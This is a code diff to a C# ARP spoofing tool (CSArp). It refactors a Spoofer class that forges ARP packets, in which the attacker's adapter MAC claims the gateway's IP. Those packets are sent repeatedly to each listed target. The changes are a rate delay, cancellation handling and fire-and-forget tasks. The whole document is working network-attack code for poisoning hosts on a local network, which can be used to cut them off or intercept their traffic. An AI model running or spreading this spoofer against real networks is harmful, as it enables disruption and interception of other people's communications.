@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Threading;
@@ -12,11 +13,10 @@ namespace CSArp.Model
 {
     public class Spoofer
     {
-        private readonly List<Task> _spoofingTasks = new List<Task>();
         private CancellationTokenSource _spoofingCts;
 
         public void Start(
-            Dictionary<IPAddress, PhysicalAddress> targetList,
+            IReadOnlyCollection<KeyValuePair<IPAddress, PhysicalAddress>> targets,
             IPAddress gatewayIpAddress,
             PhysicalAddress gatewayMacAddress,
             LibPcapLiveDevice networkAdapter)
@@ -29,25 +29,29 @@ namespace CSArp.Model
                 networkAdapter.Open();
             }
 
-            foreach (var target in targetList)
+            foreach (var target in targets)
             {
-                var arpPacketForGatewayRequest = new ArpPacket(ArpOperation.Request, "00-00-00-00-00-00".Parse(), gatewayIpAddress, networkAdapter.MacAddress, target.Key);
+                var arpPacketForGatewayRequest = new ArpPacket(
+                    ArpOperation.Request,
+                    "00-00-00-00-00-00".Parse(),
+                    gatewayIpAddress,
+                    networkAdapter.MacAddress,
+                    target.Key);
+
                 var ethernetPacketForGatewayRequest = new EthernetPacket(networkAdapter.MacAddress, gatewayMacAddress, EthernetType.Arp)
                 {
                     PayloadPacket = arpPacketForGatewayRequest
                 };
 
-                _spoofingTasks.Add(Task.Run(() => SendSpoofingPacket(target.Key, target.Value, ethernetPacketForGatewayRequest, networkAdapter, _spoofingCts.Token), _spoofingCts.Token));
+                _ = Task.Run(
+                    () => SendSpoofingPacket(target.Key, target.Value, ethernetPacketForGatewayRequest, networkAdapter, _spoofingCts.Token),
+                    _spoofingCts.Token);
             }
         }
 
-        public void StopAll()
-        {
-            _spoofingCts?.Cancel();
-            _spoofingTasks.Clear();
-        }
+        public void StopAll() => _spoofingCts?.Cancel();
 
-        private static void SendSpoofingPacket(
+        private static async Task SendSpoofingPacket(
             IPAddress ipAddress,
             PhysicalAddress physicalAddress,
             EthernetPacket ethernetPacket,
@@ -61,7 +65,11 @@ namespace CSArp.Model
                 while (!cancellationToken.IsCancellationRequested)
                 {
                     captureDevice.SendPacket(ethernetPacket);
+                    await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken).ConfigureAwait(false);
                 }
+            }
+            catch (OperationCanceledException)
+            {
             }
             catch (PcapException ex)
             {
